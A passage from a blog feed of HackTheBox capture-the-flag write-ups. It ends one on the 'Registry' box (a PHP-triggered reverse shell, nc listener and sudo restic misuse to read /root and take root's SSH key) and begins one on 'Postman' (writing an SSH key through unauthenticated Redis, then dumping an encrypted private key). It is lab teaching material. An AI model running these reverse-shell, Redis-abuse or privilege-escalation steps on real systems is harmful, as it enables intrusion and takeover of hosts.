python</span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure><p>Now our php file calling this <code>hg8.py</code> reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'&lt;?php shell_exec("/usr/bin/python /tmp/hg8.py"); ?&gt;'</span> &gt; hg8.php</span><br></pre></td></tr></table></figure><p>Finally let’s open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And let’s redo the process, edit the configuration to allow <code>.php</code> upload, upload the <code>hg8.php</code> file and open it!</p><p>If everything goes fine and you have been fast enough the connection will open. But it doesn’t… The connection just seem to hang.</p><p>The first thing that comes to mind is that a firewall is blocking any connection from outside. Since we have an access on the machine let’s try to open our listener here instead:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br></pre></td></tr></table></figure><p>Let’s now recreate our python reverse shell with <code>registry</code> IP, reupload and run our <code>hg8.php</code> and….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br><span class="line">Connection from localhost 48396 received!</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Alright, we now have access to <code>www-data</code> account. That’s a good progress. Let’s now try to find if and how we could escalate to root privilege. </p><p>While doing the usual recon for privilege escalation, we stumble across the backup command we have seem before:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bolt:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bolt:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/restic backup -r rest*</span><br></pre></td></tr></table></figure><p>It’s the <code>restic</code> command we saw in the <code>/var/www/html/backup.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/var/www/html$ cat /var/www/html/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt"</span>);</span><br></pre></td></tr></table></figure><p>Let’s check for the documentation of <code>restic</code> to understand better how it works. According to its website:</p><blockquote><p>restic is a backup program that is fast, efficient and secure. It supports the three major operating systems<br><a href="https://restic.net/" target="_blank" rel="noopener">https://restic.net/</a></p></blockquote><p>So we have a program that can be run as <code>root</code> manipulating files we can control. Sounds like a perfect scenario for privilege escalation ;)</p><p>Let’s break down the <code>restic</code> command from <code>backup.php</code> to understand exactly what’s it’s doing :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  backup        Create a new backup of files and/or directories</span><br><span class="line">bolt@bolt:/$ restic backup --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  -r, --repo string              repository to backup to or restore from (default: <span class="variable">$RESTIC_REPOSITORY</span>)</span><br></pre></td></tr></table></figure><p>Alright so if we take this command as example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restic backup -r rest:http://backup.registry.htb/bolt bolt</span><br></pre></td></tr></table></figure><p><code>restic</code> is going to back up the <code>bolt</code> folder to the distant repository available at <code>http://backup.registry.htb</code>.</p><p>Looking around it seems we can not access nor do anything at <code>http://backup.registry.htb</code>. But anyway what lays there ? According to the <code>restic</code> documentation it’s the url of a <code>restic</code> remote repository. Reading a bit more we can find a tool (<a href="https://github.com/restic/rest-server" target="_blank" rel="noopener"><code>restic-rest-server</code></a>) to create those remote repositories:</p><blockquote><p>Rest Server is a high performance HTTP server that implements restic’s REST backend API. It provides secure and efficient way to backup data remotely, using restic backup client via the rest: URL.<br><a href="https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server" target="_blank" rel="noopener">https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server</a></p></blockquote><p>Seeing this we can understand it’s what is being used on <code>http://backup.registry.htb</code>.  </p><p>With all those information in mind we start to understand how we could read files with escalated privileges:</p><ol><li>Setup a local <code>restic</code> backup server</li><li>Use the following command that <code>www-data</code> can run as <code>sudo</code> without password: </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/restic backup -r rest:http://our-restic-repo.local /root/</span><br></pre></td></tr></table></figure><ol start="3"><li>Navigate to the <code>/root/</code> folder that <code>restic</code> backup to grab the flag.</li></ol><p>It’s not yet a root shell but it should be good enough to grab the <code>root.txt</code> flag.</p><p>Alright so that was the idea, let’s see in practice now!</p><h3 id="Restic-privileged-file-read"><a href="#Restic-privileged-file-read" class="headerlink" title="Restic privileged file read"></a>Restic privileged file read</h3><p>First thing first let’s build the restic <code>rest-server</code> binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/restic/rest-server.git &amp;&amp; <span class="built_in">cd</span> rest-server</span><br><span class="line">[hg8@archbook ~]$ go run build.go</span><br></pre></td></tr></table></figure><p>Let’s now push the binary to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa rest-server bolt@registry.htb:/tmp/</span><br></pre></td></tr></table></figure><p>We can now check the documentation to understand how to run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --<span class="built_in">help</span></span><br><span class="line">Run a REST server <span class="keyword">for</span> use with restic</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  rest-server [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --append-only         <span class="built_in">enable</span> append only mode</span><br><span class="line">      --cpu-profile string  write CPU profile to file</span><br><span class="line">      --debug               output debug messages</span><br><span class="line">  -h, --<span class="built_in">help</span>                <span class="built_in">help</span> <span class="keyword">for</span> rest-server</span><br><span class="line">      --listen string       listen address (default <span class="string">":8000"</span>)</span><br><span class="line">      --<span class="built_in">log</span> string          <span class="built_in">log</span> HTTP requests <span class="keyword">in</span> the combined <span class="built_in">log</span> format</span><br><span class="line">      --no-auth             <span class="built_in">disable</span> .htpasswd authentication</span><br><span class="line">      --path string         data directory (default <span class="string">"/tmp/restic"</span>)</span><br><span class="line">      --private-repos       users can only access their private repo</span><br><span class="line">      --prometheus          <span class="built_in">enable</span> Prometheus metrics</span><br><span class="line">      --tls                 turn on TLS support</span><br><span class="line">      --tls-cert string     TLS certificate path</span><br><span class="line">      --tls-key string      TLS key path</span><br><span class="line">  -V, --version             show version and quit</span><br></pre></td></tr></table></figure><p>We have all the needed informations so let’s give a try here. First, still according to the documentation, we need to setup the repository folder :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic init --repo /tmp/hg8-backup</span><br><span class="line">enter password <span class="keyword">for</span> new repository:</span><br><span class="line">enter password again:</span><br><span class="line">created restic repository 14de0bc276 at /tmp/hg8-backup</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br></pre></td></tr></table></figure><p>Now we can start the <code>rest-server</code> with this backup path:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --path ./hg8-backup --no-auth</span><br><span class="line">Data directory: ./registrybackup</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">Starting server on :8000</span><br></pre></td></tr></table></figure><p>Sounds all good for the repository! Let’s now try to backup the <code>/root/</code> folder to our backup repository using the <code>sudo</code> command we are allowed to run without password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://localhost:8000 /root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">scanned 10 directories, 14 files <span class="keyword">in</span> 0:00</span><br><span class="line">[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00</span><br><span class="line">duration: 0:00</span><br><span class="line">snapshot 0547cce5 saved</span><br></pre></td></tr></table></figure><p><code>0 errors</code> that’s good! Now it’s time to access the file we just backup:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$  restic -r /tmp/hg8-backup/ snapshots</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">ID        Date                 Host        Tags        Directory</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">0547cce5  2020-01-28 11:51:15  bolt                    /root</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">9 snapshots</span><br><span class="line"></span><br><span class="line">bolt@bolt:/$ restic -r /tmp/hg8-backup/ restore 0547cce5 --target /tmp/restored-root</span><br><span class="line">enter password <span class="keyword">for</span> repository:</span><br><span class="line">password is correct</span><br><span class="line">restoring &lt;Snapshot 0547cce5 of [/root] at 2020-01-28 11:51:15.656860319 +0000 UTC by root@bolt&gt; to /tmp/restored-root</span><br></pre></td></tr></table></figure><p>All that remains to do now is retrieving our flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp$ cat /tmp/restored-root/root/root.txt</span><br><span class="line">ntxxxxxxxxxxxxxxxxxxxxxxxxxxxgw</span><br></pre></td></tr></table></figure><p>Looking around we can even find the <code>root</code> account private ssh key and use it to obtain a root shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ ssh -i /tmp/restored-root/root/.ssh/id_rsa root@registry.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 28 11:55:43 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 26%               IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Processes:    173</span><br><span class="line">Last login: Mon Oct 21 09:53:48 2019</span><br><span class="line">root@bolt:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> enumeration </tag>
            
            <tag> docker </tag>
            
            <tag> webshell </tag>
            
            <tag> sudo </tag>
            
            <tag> php </tag>
            
            <tag> shell_exec </tag>
            
            <tag> registry </tag>
            
            <tag> docker-registry </tag>
            
            <tag> restic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Postman</title>
      <link href="/posts/postman/"/>
      <url>/posts/postman/</url>
      
        <content type="html"><![CDATA[<img width="579" alt="postman-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158578-15afb680-9889-11ea-8f61-43fd6bd253f8.png"><p>Postman was an “easy” rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.  </p><p><strong>Tl;Dr:</strong> The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from <code>redis</code> user to <code>Matt</code> user.<br>Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.</p><p>Alright, let’s get into it!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.160 postman.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:34 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">'s Personal Website</span></span><br><span class="line"><span class="string">10000/tcp open  ssl/http MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 46.41 seconds</span></span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. We also have a Webmin server running on port 10000.</p><p>Opening <code>http://postman.htb</code> display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png" alt="postman website"></p><p>While <code>https://postman.htb:10000/</code> display the classical Webmin login page:</p><p><img src="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png" alt="postman webmin"></p><p>Starting from there….well… There isn’t anything interesting. I run into a lot of rabbit holes without being able to find anything. </p><p>In particularly I tried running exploits against the Webmin instance including the infamous <a href="https://twitter.com/_hg8_/status/1162694712177954819" target="_blank" rel="noopener">CVE-2019-15107 - Remote Code Execution via Password Reset function</a>. But I couldn’t get anything to work nor making progress any progress. </p><p>A piece of the puzzle looked missing to me. When this happen I like to restart my recon process from the beginning, to make sure I didn’t forgot anything.</p><p>Let’s start by re-running <code>nmap</code>, but this time on the top 10,000 ports:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC --top-ports 10000 postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:39 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 8316 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">'s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn'</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 150.41 seconds</span><br></pre></td></tr></table></figure><p>Aah that’s interesting! A new service appeared. A redis instance running on port 6379. That’s probably the missing piece of our puzzle.</p><p>Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything.<br>During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96" target="_blank" rel="noopener">“A few things about Redis security”</a>.</p><p>The article, written by one of the redis dev, explain how to “<em>crack Redis for fun and no profit</em>“ on exposed redis instance with no authentication activated.</p><p>Maybe it’s our case ? First, let’s check if the redis instance need authentication:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ telnet postman.htb 6379</span><br><span class="line">Trying 10.10.10.160...</span><br><span class="line">Connected to postman.htb.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Hey no AUTH required!"</span></span><br><span class="line"><span class="variable">$21</span></span><br><span class="line">Hey no AUTH required!</span><br><span class="line">quit</span><br><span class="line">+OK</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure><p>Well, indeed not auth is needed to access this redis instance, that’s good news. Let’s follow the article to see if we can exploit it the same way the author present in his article.</p><p>The next step described in the article is to write our own SSH Public key into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p><p>First step is to generate a ssh key pair that we will add to the <code>authorized_keys</code> of the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh-keygen -t rsa -C <span class="string">"hg8@hg8.hg8"</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/hg8/.ssh/id_rsa): ./id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> ./id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> ./id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 hg8@hg8.hg8</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+--[ RSA 2048]----+</span></span><br><span class="line"><span class="string">|          .   O+.|</span></span><br><span class="line"><span class="string">|       . o o..o*o|</span></span><br><span class="line"><span class="string">|      = . + .+ . |</span></span><br><span class="line"><span class="string">|     o B o    .  |</span></span><br><span class="line"><span class="string">|    . o S    E . |</span></span><br><span class="line"><span class="string">|     .        o  |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">+-----------------+</span></span><br></pre></td></tr></table></figure><p>I quote the author on this part since he explains way better than me:</p><blockquote><p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; id_rsa_with_nl.pub</span><br></pre></td></tr></table></figure><p>Now that we have all the pieces, let’s add our ssh key to the <code>authorized_keys</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 <span class="built_in">echo</span> flushall</span><br><span class="line"><span class="string">"flushall"</span></span><br><span class="line">[hg8@archbook ~]$ cat id_rsa_with_nl.pub | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> crackit</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>Then let’s try to login using this generated ssh key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa redis@postman.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1</span><br><span class="line">redis@Postman:~$</span><br></pre></td></tr></table></figure><h3 id="Pivot-Redis-gt-Matt"><a href="#Pivot-Redis-gt-Matt" class="headerlink" title="Pivot Redis -&gt; Matt"></a>Pivot Redis -&gt; Matt</h3><p>Ok, now we have access to the machine with <code>redis</code> user, let’s now find the user to pivot to :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ ls -l /home/Matt/</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 user.txt</span><br></pre></td></tr></table></figure><p><code>Matt</code> is our user. Let’s do a bit more of recon to see if we can find additional informations.</p><p>While searching around, we find an interesting backup file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:/$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span 